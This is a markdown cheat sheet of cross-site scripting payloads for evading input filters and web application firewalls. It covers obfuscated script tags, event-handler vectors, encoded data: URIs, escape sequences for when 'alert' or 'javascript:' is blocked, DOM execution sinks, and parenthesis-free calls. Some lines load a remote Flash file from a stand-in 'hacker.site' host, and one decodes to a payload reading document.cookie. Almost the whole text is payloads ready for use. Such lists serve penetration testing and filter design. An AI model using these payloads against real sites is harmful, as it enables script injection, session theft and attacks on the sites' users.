# XSS - Filter Evasion and WAF Bypassing





```
<ScRiPt>alert(1);</ScRiPt>

<ScRiPt>alert(1);

<script/random>alert(1)</script>

<script
alert(1);</script>								//new line after the tag name

<scr<script>ipt>alert(1);</scr</script>ipt>		//Nested tags

<scr\x00ipt>alert(1);</scr\x00ipt>				//Null byte

<a href="javascript:alert(1)">show</a>

<a href="data:text/html; base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">show</a>

<form id=x></form><button form="x" formaction ="javascript:alert(1)">send</button>

<object data="data:text/html,<script>alert(1)</script>">

<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<object data ="//hacker.site/xss.swf">				//https://github.com/evilcos/xss.swf

<embed code ="//hacker.site/xss.swf" allowscriptaccess=always>

<img src=x onerror=alert(1)>

<body onload =alert(1)>

<input type=image src=x:x onerror =alert(1)>

<isindex onmouseover="alert(1)">

<form oninput=alert(1)><input></form>

<textarea autofocus onfocus =alert(1)>

<input oncut =alert(1)>

<svg onload=alert(1)>

<svg/onload=alert(1)>

<svg/////onload=alert(1)>

<svg/id=x; onload=alert(1)>

<svg id=x; onload=alert(1)>

<video><source onerror ="alert(1)">

<marquee onstart =alert(1)>
```





XSS vectors:

- https://shazzer.co.uk/vectors



if alert is blocked

```
<script>\u0061lert(1)</script>						// unicode escape

<script>\u{0061}lert("l33t")</script>

<script>\u0061\u006C\u0065\u0072\u0074(1)</script>

<script>eval(\u0061lert(1))</<script>	

<script>eval("\u0061\u006C\u0065\u0072\u0074(1)")</script>

<img src=x onerror="\u0061lert(1)">

<img src=x onerror="eval('\141lert(1)')"/>			// octal escape

<img src=x onerror="eval('\x61lert(1)')"/>			// hex escape

<img src=x onerror="&#97;lert(1)"/>

<img src=x onerror="&#x0061;lert(1)"/>

<img src=x onerror="eval('a\l\ert\(1\)')"/>

<img src=x onerror="\u0065val('\141\u006c&#101;&#x0072t\(&#49)')"/>

<img src=a onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
```





DOM XSS:

```
setTimeout(alert(1), 500);
setInterval(alert(1), 500);
Function(alert(1));
[].constructor.constructor(alert(1));
```



if javascript: is blocked

```
<img src=x onerror="jAvaScRiPt:alert(1)">

<img src=x onerror="javascript&colon;alert(1)">
 
<img src=x onerror="javascript&#58;alert(1)">

<img src=x onerror="javascript&#x003A;alert(1)">
 
<img src=x onerror="&#x6Aavascript:alert(1)">
 
```



data:

```
<object data="data:text/html;javascript,<script>alert(1)</script>" >
  
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<object data="DaTa:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<object data="data&colon;text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```



Bypassing Sanitization

```
<scr<script>ipt>alert(1)</script>

<scr<iframe>ipt>alert(1)</script>

<a href="javascript:
eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59))">a</a>

decodeURI(/alert(%22xss%22)/.source)

decodeURIComponent(/alert(%22xss%22)/.source)
```



Escaping Parentheses

```
<img src=z onerror=alert`1`>

<img src=z onerror="window.onerror=eval;throw'=alert\x281\x29'">
```







- https://html5sec.org/
- https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- https://code.google.com/archive/p/domxsswiki/
- https://www.compart.com/en/unicode/search?q=#characters
